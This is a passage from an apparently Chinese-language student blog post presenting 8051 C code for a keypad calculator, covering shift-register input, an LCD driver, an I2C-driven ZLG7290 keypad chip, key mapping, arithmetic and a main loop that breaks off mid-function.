class="line"></div><div class="line">void hc165_init()&#123;</div><div class="line">	hc165_sdo=1;</div><div class="line">	hc165_sclk=0;</div><div class="line">	hc165_pl=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">unsigned char hc165_re(void)&#123;</div><div class="line">	unsigned i,x=0;</div><div class="line">	hc165_pl=0;</div><div class="line">	x=x+0;</div><div class="line">	hc165_pl=1;</div><div class="line">	if( hc165_sdo == 1 )</div><div class="line">		x = x + 1;</div><div class="line">	for( i = 0;i &lt; 7;i ++)&#123;</div><div class="line">		hc165_sclk=1;</div><div class="line">		x = x &lt;&lt; 1;</div><div class="line">		hc165_sclk=0;</div><div class="line">		if( hc165_sdo == 1 )</div><div class="line">			x = x + 1;</div><div class="line">	&#125;</div><div class="line">	return x;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里是LCD显示的函数，主要实现的是送字符给LCD显示，还有确定LCD显示位置的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">sbit LCD_E = P2^2;</div><div class="line">sbit LCD_RW = P2^1;</div><div class="line">sbit LCD_RS = P2^0;</div><div class="line">sbit HC164_SDAT = P2^3;</div><div class="line">sbit HC164_SCLK = P2^4;</div><div class="line">void send_data(unsigned char dat) &#123;</div><div class="line">	unsigned char i;</div><div class="line">	for(i = 0; i &lt; 8; i++)&#123;</div><div class="line">		HC164_SCLK = 0;</div><div class="line">		if(dat &amp; 0x80)&#123;</div><div class="line">			HC164_SDAT = 1;</div><div class="line">		&#125;</div><div class="line">		else&#123;</div><div class="line">			HC164_SDAT = 0;</div><div class="line">		&#125;</div><div class="line">		HC164_SCLK = 1;</div><div class="line">		dat = dat &lt;&lt; 1;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Delay1ms(unsigned int c) &#123;</div><div class="line">	unsigned char a,b;</div><div class="line">	for(; c&gt;0; c--) &#123;</div><div class="line">		for(b = 199; b &gt; 0; b--) &#123;</div><div class="line">			for(a = 1; a &gt; 0; a--);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void LcdWrCmd(unsigned char com) &#123;</div><div class="line">	unsigned char x;</div><div class="line">	LCD_E = 0;</div><div class="line">	LCD_RS = 0;</div><div class="line">	LCD_RW = 0;</div><div class="line">	</div><div class="line">	send_data(com);</div><div class="line">	x++;</div><div class="line">	LCD_E = 1;</div><div class="line">	x++;</div><div class="line">	LCD_E = 0;</div><div class="line">	Delay1ms(1);</div><div class="line">&#125;</div><div class="line">void LcdWrData(unsigned char dat) &#123;</div><div class="line">	unsigned char x;</div><div class="line">	LCD_E = 0;</div><div class="line">	LCD_RS = 1;</div><div class="line">	LCD_RW = 0;</div><div class="line"></div><div class="line">	send_data(dat);</div><div class="line">	x++;</div><div class="line">	LCD_E = 1;</div><div class="line">	x++;</div><div class="line">	LCD_E = 0;</div><div class="line">	Delay1ms(1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void disp_line(unsigned char line) &#123;</div><div class="line">	if(line == 0)&#123;</div><div class="line">		LcdWrCmd(0x80 + 0x00);</div><div class="line">	&#125;</div><div class="line">	else&#123;</div><div class="line">		LcdWrCmd(0x80 + 0x40);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void LcdInit()&#123;</div><div class="line">	LcdWrCmd(0x38);</div><div class="line">	LcdWrCmd(0x0c);</div><div class="line">	LcdWrCmd(0x06);</div><div class="line">	LcdWrCmd(0x01);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>老师给我们的实验板上有一块ZLG7920芯片，我们用它来做4*4矩阵键盘的读值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include  &quot;i2c.h&quot;</div><div class="line">#include  &quot;ZLG7290.h&quot;</div><div class="line">#define	EEPROM24C02	0xA0</div><div class="line">#define  ZLG7290    0x70   </div><div class="line">#define  SubKey     0x01 </div><div class="line">#define  SubCmdBuf  0x07</div><div class="line">#define  SubDpRam   0x10</div><div class="line"></div><div class="line">unsigned char key_code=0x4d;</div><div class="line">unsigned char key_press=0;</div><div class="line"></div><div class="line">void ZLG7290_ReadData(unsigned char address,unsigned char num)</div><div class="line">&#123;</div><div class="line">    IRcvStr(ZLG7290,address,I2C_temp,num);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">void Read_ZLG7290Key(void)</div><div class="line">&#123;</div><div class="line">    char  usTmp;</div><div class="line">    ZLG7290_ReadData(1,1);</div><div class="line">    usTmp=I2C_temp[0];</div><div class="line">    if(usTmp !=0)</div><div class="line">    &#123;</div><div class="line">        if(usTmp&lt;0x41)</div><div class="line">        &#123;</div><div class="line">            key_press=1;</div><div class="line">            key_code=usTmp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void delayMS(unsigned int i)</div><div class="line">&#123;</div><div class="line">	unsigned int j,k;</div><div class="line">	for(k=0;k&lt;i;k++)</div><div class="line">		for(j=0;j&lt;60;j++);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这个芯片需要使用I2C总线，所以我们需要添加I2C总线的底层文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div></pre></td><td class="code"><pre><div class="line">#include  &quot;I2C.H&quot;</div><div class="line">#include &lt;REG52.H&gt;</div><div class="line">#include &lt;intrins.h&gt;</div><div class="line"></div><div class="line">#define  NOP()   _nop_()   </div><div class="line">#define  _Nop()  _nop_()  </div><div class="line"></div><div class="line">sbit     SCL=P1^6;    </div><div class="line">sbit     SDA=P1^7;    </div><div class="line"></div><div class="line">bit ack;                 </div><div class="line"></div><div class="line">unsigned char I2C_temp[8]=&#123;&quot;01234567&quot;&#125;;                </div><div class="line"></div><div class="line">void Start_I2c()</div><div class="line">&#123;</div><div class="line">  	SDA=1;         </div><div class="line">  	_Nop();</div><div class="line">  	SCL=1;</div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SDA=0;        </div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SCL=0;       </div><div class="line">  	I2C_delay(10);   </div><div class="line">&#125;</div><div class="line"></div><div class="line">void Stop_I2c()</div><div class="line">&#123;</div><div class="line">  	SDA=0;      </div><div class="line">  	_Nop();      </div><div class="line">  	SCL=1;      </div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SDA=1;      </div><div class="line">  	I2C_delay(10);   </div><div class="line">&#125;</div><div class="line"></div><div class="line">void  SendByte(unsigned char  c)</div><div class="line">&#123;</div><div class="line"> 	unsigned char  BitCnt;</div><div class="line"> </div><div class="line"> 	for(BitCnt=0;BitCnt&lt;8;BitCnt++) </div><div class="line">    &#123;</div><div class="line">     	if((c&lt;&lt;BitCnt)&amp;0x80)SDA=1;   </div><div class="line">       		else  SDA=0;                </div><div class="line">     	_Nop();</div><div class="line">     	SCL=1;</div><div class="line">  		I2C_delay(10);   </div><div class="line">     	SCL=0; </div><div class="line">  		I2C_delay(10);   </div><div class="line">    &#125;</div><div class="line">  	I2C_delay(10);   </div><div class="line">    SDA=1;               </div><div class="line">  	I2C_delay(10);   </div><div class="line">    SCL=1;</div><div class="line">  	I2C_delay(10);   </div><div class="line">    if(SDA==1)ack=0;     </div><div class="line">       else ack=1;       </div><div class="line">    SCL=0;</div><div class="line">  	I2C_delay(10);   </div><div class="line">&#125;</div><div class="line">   </div><div class="line">unsigned char   RcvByte()</div><div class="line">&#123;</div><div class="line">  	unsigned char  retc;</div><div class="line">  	unsigned char  BitCnt;</div><div class="line">  </div><div class="line">  	retc=0; </div><div class="line">  	SDA=1;                     </div><div class="line">  	for(BitCnt=0;BitCnt&lt;8;BitCnt++)</div><div class="line">    &#123;</div><div class="line">  		I2C_delay(10);   </div><div class="line">        SCL=0;              </div><div class="line">	  	I2C_delay(10);   </div><div class="line">        SCL=1;                  </div><div class="line">  		I2C_delay(10);   </div><div class="line">        retc=retc&lt;&lt;1;</div><div class="line">        if(SDA==1)retc=retc+1; </div><div class="line">  		I2C_delay(10);   </div><div class="line">    &#125;</div><div class="line">  	SCL=0;    </div><div class="line">  	I2C_delay(10);   </div><div class="line">  	return(retc);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Ack_I2c(bit a)</div><div class="line">&#123;</div><div class="line">  	if(a==0)SDA=0;        </div><div class="line">  		else SDA=1;</div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SCL=1;</div><div class="line">  	I2C_delay(10);   </div><div class="line">  	SCL=0;                </div><div class="line">  	I2C_delay(10);   </div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">bit IRcvStr(unsigned char  sla,unsigned char  suba,unsigned char  *s,unsigned char  no)</div><div class="line">&#123;</div><div class="line">   	unsigned char i;</div><div class="line"></div><div class="line">   	Start_I2c();                </div><div class="line">   	SendByte(sla);               </div><div class="line">   	if(ack==0)return(0);</div><div class="line">   	SendByte(suba);            </div><div class="line">   	if(ack==0)return(0);</div><div class="line"></div><div class="line">   	Start_I2c();                </div><div class="line">   	SendByte(sla+1);</div><div class="line">   	if(ack==0)return(0);</div><div class="line">   	for(i=0;i&lt;no-1;i++)</div><div class="line">   	&#123;   </div><div class="line">     	*s=RcvByte();             </div><div class="line">      	Ack_I2c(0);                 </div><div class="line">     	s++;</div><div class="line">   	&#125; </div><div class="line">   	*s=RcvByte();</div><div class="line">   	Ack_I2c(1);                   </div><div class="line">   	Stop_I2c();                    </div><div class="line">   	return(1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void  I2C_Init(void)</div><div class="line">&#123;</div><div class="line">    SCL=1;</div><div class="line">    SDA=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void I2C_delay(unsigned char dly)</div><div class="line">&#123;</div><div class="line">	while(dly--);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="用户层"><a href="#用户层" class="headerlink" title="用户层"></a>用户层</h4><p>键值扫描的程序，使用hc165和zlg7290,读回键值并做一次转换。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;keyscan_basic.h&gt;</div><div class="line"></div><div class="line">extern unsigned char step;</div><div class="line">extern unsigned char state;</div><div class="line"></div><div class="line">int keyscan_transfer(unsigned char key) &#123;</div><div class="line">	int keyscan_transfer = 0;</div><div class="line">	switch(key) &#123;</div><div class="line">		case 0x01:keyscan_transfer = 7; break; </div><div class="line">		case 0x02:keyscan_transfer = 8; break; </div><div class="line">		case 0x03:keyscan_transfer = 9; break;</div><div class="line">		case 0x04:keyscan_transfer = 10; step = 1; break;</div><div class="line">		case 0x05:keyscan_transfer = 4;	break;</div><div class="line">		case 0x06:keyscan_transfer = 5; break;</div><div class="line">		case 0x07:keyscan_transfer = 6; break;</div><div class="line">		case 0x08:keyscan_transfer = 11; step = 1; break;</div><div class="line">		case 0x09:keyscan_transfer = 1; break;</div><div class="line">		case 0x0A:keyscan_transfer = 2; break; </div><div class="line">		case 0x0B:keyscan_transfer = 3; break;</div><div class="line">		case 0x0C:keyscan_transfer = 12; step = 1; break;</div><div class="line">		case 0x0D:keyscan_transfer = 0; break;</div><div class="line">		case 0x0E:keyscan_transfer = 15; state = 1; break;</div><div class="line">		case 0x0F:step = 3;keyscan_transfer = 14; break;</div><div class="line">		case 0x10:keyscan_transfer = 13; step = 1; break; </div><div class="line">	&#125;</div><div class="line">	return keyscan_transfer;	</div><div class="line">&#125;</div><div class="line"></div><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;keyscan_advance.h&gt;</div><div class="line">#include&lt;zlg7290.h&gt;</div><div class="line">extern int tempNumtransfer_1;</div><div class="line">extern int tempNumtransfer_2;</div><div class="line">extern int tempKeytransfer_1;</div><div class="line">extern int tempKeytransfer_2;</div><div class="line">extern unsigned char step;</div><div class="line">extern unsigned char result;</div><div class="line">extern int num_temp;</div><div class="line">void key_function(void) &#123;</div><div class="line">	unsigned char key_function;</div><div class="line">	key_function = hc165_re();</div><div class="line">	Delay1ms(100);</div><div class="line">	key_function = hc165_re();</div><div class="line">	switch(key_function)&#123;</div><div class="line">		case 0xfd: clear_step(); break; </div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void clear_step(void) &#123;</div><div class="line">	tempNumtransfer_1 = 0;</div><div class="line">	tempNumtransfer_2 = 0;</div><div class="line">	tempKeytransfer_1 = 0;</div><div class="line">  	tempKeytransfer_2 = 0;</div><div class="line">	step = 0;</div><div class="line">	disp_line(0);</div><div class="line">	LcdWrCmd(0x01);</div><div class="line">	LcdWrCmd(0x80);</div><div class="line">	key_press = 0;</div><div class="line">	num_temp = 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>计算器核心计算功能实现:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;keyscan_basic.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">int num_temp = 0;</div><div class="line">int dec_temp = 0;</div><div class="line">unsigned char buf[12];</div><div class="line">extern unsigned char step;</div><div class="line">unsigned char LongToString(int dat)&#123;</div><div class="line">    signed char i = 0;</div><div class="line">    unsigned char len = 0;</div><div class="line">   </div><div class="line">    if (dat &lt; 0)&#123;</div><div class="line">        dat = -dat;</div><div class="line">        buf[0] = &apos;-&apos;;</div><div class="line">		i++;</div><div class="line">		len++;</div><div class="line">    &#125;</div><div class="line">   </div><div class="line">    do &#123;</div><div class="line">        buf[i] = dat % 10;</div><div class="line">		i++;</div><div class="line">        dat /= 10;</div><div class="line">    &#125; while (dat &gt; 0);</div><div class="line">    len += i; </div><div class="line">	return len;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int number_transfer(int key_transfer) &#123;</div><div class="line"></div><div class="line">	num_temp = num_temp*10 + key_transfer;</div><div class="line">	return num_temp;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int number_calculate(int num_1, int num_2,unsigned char key) &#123;</div><div class="line">	int result;</div><div class="line">	switch(key)&#123;</div><div class="line">		case 0x04: result = num_1 + num_2; break;</div><div class="line">		case 0x08: result = num_1 - num_2; break;</div><div class="line">		case 0x0C: result = num_1 * num_2; break;</div><div class="line">		case 0x10: result = num_1 / num_2; break;</div><div class="line">	&#125;</div><div class="line">	return result;	</div><div class="line">&#125;</div><div class="line"></div><div class="line">int decimal_transfer(int key_transfer) &#123;</div><div class="line"></div><div class="line">	dec_temp = dec_temp * 10 + key_transfer;	</div><div class="line">	return dec_temp;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>显示功能设计：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;calc.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;display.h&gt;</div><div class="line"></div><div class="line">unsigned char state = 0;</div><div class="line">extern unsigned char buf[12];</div><div class="line">unsigned char code ascii[]=&#123;&quot;0123456789&quot;&#125;;</div><div class="line">extern int temp;</div><div class="line">extern unsigned char step;</div><div class="line">int lcd_numdisplay(int num)&#123;</div><div class="line">	unsigned char arrayLength;</div><div class="line">	unsigned char i;</div><div class="line">	arrayLength = LongToString(num);</div><div class="line">	for(i = 0; i &lt; arrayLength; i++) &#123;</div><div class="line">		if(step == 0 || step == 2 || step == 3)</div><div class="line">			LcdWrData(ascii[buf[arrayLength-i-1]]); </div><div class="line">	&#125;</div><div class="line">	return arrayLength;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void lcd_flagdisplay(int num) &#123;</div><div class="line">	switch(num) &#123;</div><div class="line">		case 10: LcdWrData(&apos;+&apos;); break;</div><div class="line">		case 11: LcdWrData(&apos;-&apos;); break;</div><div class="line">		case 12: LcdWrData(&apos;*&apos;); break;</div><div class="line">		case 13: LcdWrData(&apos;/&apos;); break;</div><div class="line">	&#125;</div><div class="line">	step = 2;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void decimal_display(void) &#123;</div><div class="line">		LcdWrData(&apos;.&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>主函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;display.h&gt;</div><div class="line">#include&lt;calc.h&gt;</div><div class="line">#include&lt;I2C.h&gt;</div><div class="line">#include&lt;zlg7290.h&gt;</div><div class="line">#include&lt;keyscan_basic.h&gt;</div><div class="line">#include&lt;keyscan_advance.h&gt;</div><div class="line">int tempKeytransfer_1 = 0;</div><div class="line">int tempNumtransfer_1 = 0;</div><div class="line">int tempKeytransfer_2 = 0;</div><div class="line">int tempNumtransfer_2 = 0;</div><div class="line">int tempKeytransfer_3 = 0;</div><div class="line">int tempNumtransfer_3 = 0;</div><div class="line">int tempKeytransfer_4 = 0;</div><div class="line">int tempNumtransfer_4 = 0;</div><div class="line">int resultTransfer;</div><div class="line">int result = 0;</div><div class="line">int decimal_result = 0;</div><div class="line">unsigned char decimalFlag_1 = 0;</div><div class="line">unsigned char decimalFlag_2 = 0;</div><div class="line">unsigned char step = 0;</div><div class="line">int temp_useless;</div><div class="line">int temp_decimal_useless;</div><div class="line">int temp;</div><div class="line">int temp_decimal;</div><div class="line">extern int num_temp;</div><div class="line">extern int dec_temp;</div><div class="line">extern unsigned char state;</div><div class="line">void main()&#123;</div><div class="line">	unsigned char tempKeycode;</div><div class="line">	hc165_init();</div><div class="line">	I2C_Init();</div><div class="line">	LcdInit();</div><div class="line">	while(1)&#123;</div><div class="line">		Read_ZLG7290Key();</div><div class="line">		delayMS(200);</div><div class="line">		key_function();</div><div class="line">		if(key_press == 1 &amp;&amp; step == 0 &amp;&amp; state == 0) &#123;</div><div class="line">			key_press = 0;</div><div class="line">			tempKeytransfer_1 = keyscan_transfer(key_code);</div><div class="line">			if(key_code != 0x04 &amp;&amp; key_code != 0x08 &amp;&amp; key_code != 0x0C &amp;&amp; key_code != 0x10 &amp;&amp; key_code != 0x0E) &#123;</div><div class="line">				tempNumtransfer_1 = number_transfer(tempKeytransfer_1);</div><div class="line">				disp_line(0);</div><div class="line">				temp = lcd_numdisplay(tempNumtransfer_1);</div><div class="line">			&#125;</div><div class="line">			LcdWrCmd(0x80+temp);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(key_press == 1 &amp;&amp; step == 0 &amp;&amp; state == 1)&#123;</div><div class="line">			key_press = 0;</div><div class="line">			LcdWrCmd(0x80+temp);</div><div class="line">			decimal_display();</div><div class="line">			tempKeytransfer_3 = keyscan_transfer(key_code);</div><div class="line">			if(key_code != 0x04 &amp;&amp; key_code != 0x08 &amp;&amp; key_code != 0x0C &amp;&amp; key_code != 0x10 &amp;&amp; key_code != 0x0E) &#123;</div><div class="line">				tempNumtransfer_3 = decimal_transfer(tempKeytransfer_3);</div><div class="line">				temp_decimal = lcd_numdisplay(tempNumtransfer_3) + 1;	</div><div class="line">			&#125;</div><div class="line">			LcdWrCmd(0x80+temp+temp_decimal);</div><div class="line">			decimalFlag_1 = 1;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(key_press == 1 &amp;&amp; step == 1) &#123;</div><div class="line">			key_press = 0;</div><div class="line">			tempKeycode = key_code;</div><div class="line">			lcd_flagdisplay(keyscan_transfer(key_code));</div><div class="line">			num_temp = 0;</div><div class="line">			dec_temp = 0;</div><div class="line">			state = 0;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		if(key_press == 1 &amp;&amp; step == 2 &amp;&amp; state == 0) &#123;</div><div class="line">			key_press = 0;</div><div class="line">			LcdWrCmd(0x80+temp+temp_decimal+1);</div><div class="line">			tempKeytransfer_2 = keyscan_transfer(key_code);</div><div class="line">			if(key_code != 0x0F &amp;&amp; key_code != 0x0E)&#123;</div><div class="line">				tempNumtransfer_2 = number_transfer(tempKeytransfer_2);</div><div class="line">				temp_useless = lcd_numdisplay(tempNumtransfer_2);</div><div class="line">			&#125;</div><div class="line">			LcdWrCmd(0x80+temp+temp_decimal+temp_useless+1);</div><div class="line">			